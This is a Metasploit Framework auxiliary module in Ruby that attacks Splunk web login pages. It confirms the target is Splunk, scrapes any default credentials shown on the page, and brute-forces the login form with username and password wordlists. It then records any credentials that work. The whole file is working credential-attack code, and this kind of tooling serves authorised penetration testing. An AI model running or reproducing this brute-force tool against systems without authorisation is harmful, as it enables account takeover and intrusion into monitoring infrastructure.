##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Scanner

  def initialize(info={})
    super(update_info(info,
      'Name'           => 'Splunk Web interface Login Utility',
      'Description'    => %{
        This module simply attempts to login to a Splunk web interface.  Please note the
        free version of Splunk actually does not require any authentication, in that case
        the module will abort trying.  Also, some Splunk applications still have the
        default credential 'admin:changeme' written on the login page.  If this default
        credential is found, the module will also store that information, and then move on
        to trying more passwords.
      },
      'Author'         =>
        [
          'Vlatko Kosturjak <kost[at]linux.hr>',
          'sinn3r'
        ],
      'License'        => MSF_LICENSE
    ))

    register_options(
      [
        Opt::RPORT(8000),
        OptString.new('URI', [true, "URI for Splunk Web login. Default is /en-US/account/login", "/en-US/account/login"]),
        OptPath.new('USERPASS_FILE',  [ false, "File containing users and passwords separated by space, one pair per line",
          File.join(Msf::Config.data_directory, "wordlists", "http_default_userpass.txt") ]),
        OptPath.new('USER_FILE',  [ false, "File containing users, one per line",
          File.join(Msf::Config.data_directory, "wordlists", "http_default_users.txt") ]),
        OptPath.new('PASS_FILE',  [ false, "File containing passwords, one per line",
          File.join(Msf::Config.data_directory, "wordlists", "http_default_pass.txt") ])
      ], self.class)
  end

  def run_host(ip)
    if not is_app_splunk?
      print_error("Application does not appear to be Splunk. Module will not continue.")
      return
    end

    print_status("Checking if authentication is required...")
    if not is_auth_required?
      print_warning("Application does not require authentication.")
      return
    end

    status = try_default_credential
    return if status == :abort

    print_status("Brute-forcing...")
    each_user_pass do |user, pass|
      do_login(user, pass)
    end
  end


  #
  # What's the point of running this module if the app actually isn't Splunk?
  #
  def is_app_splunk?
    res = send_request_raw({'uri' => datastore['URI']})
    return (res and res.code == 200 and res.body =~ /Splunk/)
  end

  def get_login_cookie
    res = send_request_raw({'uri' => datastore['URI']})

    uid             = ''
    session_id_port = ''
    session_id      = ''
    cval            = ''

    if res and res.code == 200 and res.headers['Set-Cookie']
      res.headers['Set-Cookie'].split(';').each {|c|
        c.split(',').each {|v|
          if v.split('=')[0] =~ /cval/
            cval = v.split('=')[1]
          elsif v.split('=')[0] =~ /uid/
            uid = v.split('=')[1]
          elsif v.split('=')[0] =~ /session_id/
            session_id_port = v.split('=')[0]
            session_id = v.split('=')[1]
          end
        }
      }
      return uid.strip, session_id_port.strip, session_id.strip, cval.strip
    end

    return nil
  end


  #
  # Test and see if the default credential works
  #
  def try_default_credential
    p = /Splunk's default credentials are <\/p><p>username: <span>(.+)<\/span><br \/>password: <span>(.+)<\/span>/
    res = send_request_raw({'uri' => datastore['URI']})
    user, pass = res.body.scan(p).flatten
    do_login(user, pass) if user and pass
  end


  #
  # The free version of Splunk does not require authentication. Instead, it'll log the
  # user right in as 'admin'. If that's the case, no point to brute-force, either.
  #
  def is_auth_required?
    uid, session_id_port, session_id, cval = get_login_cookie
    res = send_request_raw({
      'uri'    => '/en-US/app/launcher/home',
      'cookie' => "uid=#{uid}; #{session_id_port}=#{session_id}; cval=#{cval}"
    })

    return (res and res.body =~ /Logged in as (.+)/) ? false : true
  end


  #
  # Brute-force the login page
  #
  def do_login(user, pass)
    vprint_status("Trying username:'#{user}' with password:'#{pass}'")
    begin
      cval = ''
      uid, session_id_port, session_id, cval = get_login_cookie
      if !uid or !session_id_port or !session_id or !cval
        print_error("Failed to get login cookies, aborting!")
        return :abort
      end

      res = send_request_cgi(
      {
        'uri'       => datastore['URI'],
        'method'    => 'POST',
        'cookie'    => "uid=#{uid}; #{session_id_port}=#{session_id}; cval=#{cval}",
        'vars_post' =>
          {
            'cval'     => cval,
            'username' => user,
            'password' => pass
          }
      })

      if not res or res.code != 303
        vprint_error("FAILED LOGIN. '#{user}' : '#{pass}' with code #{res.code}")
        return :skip_pass
      else
        print_good("SUCCESSFUL LOGIN. '#{user}' : '#{pass}'")

        report_hash = {
          :host   => datastore['RHOST'],
          :port   => datastore['RPORT'],
          :sname  => 'splunk-web',
          :user   => user,
          :pass   => pass,
          :active => true,
          :type => 'password'}

        report_auth_info(report_hash)
        return :next_user
      end
    rescue ::Rex::ConnectionError, Errno::ECONNREFUSED, Errno::ETIMEDOUT
      print_error("HTTP Connection Failed, Aborting")
      return :abort
    end
  end

end
